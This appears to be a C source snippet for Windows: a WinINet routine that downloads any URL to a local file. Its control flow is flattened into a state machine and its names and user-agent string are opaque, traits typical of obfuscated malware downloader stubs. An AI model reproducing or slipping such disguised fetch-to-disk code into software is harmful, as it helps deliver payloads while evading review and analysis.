#include <windows.h>
#include <wininet.h>

void __attribute__((noinline)) __attribute__((used)) routine_v5(const char* url, const char* dest){
    int s = 1;
    HINTERNET i = NULL;
    HINTERNET u = NULL;
    HANDLE f = NULL;
    char b[2048];
    DWORD r, w;

    while (s != 0) {
        switch (s) {
            case 1:
                i = InternetOpenA("S", 1, NULL, NULL, 0);
                s = (i != NULL) ? 2 : 0;
                break;
            case 2:
                u = InternetOpenUrlA(i, url, NULL, 0, 0x80000000, 0);
                s = (u != NULL) ? 3 : 6;
                break;
            case 3:
                f = CreateFileA(dest, GENERIC_WRITE, 0, NULL, 2, 128, NULL);
                s = (f != INVALID_HANDLE_VALUE) ? 4 : 5;
                break;
            case 4:
                if (InternetReadFile(u, b, 2048, &r) && r > 0) {
                    WriteFile(f, b, r, &w, NULL);
                    s = 4;
                } else {
                    s = 5;
                }
                break;
            case 5:
                if (f != INVALID_HANDLE_VALUE) CloseHandle(f);
                s = 6;
                break;
            case 6:
                if (u) InternetCloseHandle(u);
                if (i) InternetCloseHandle(i);
                s = 0;
                break;
        }
    }
}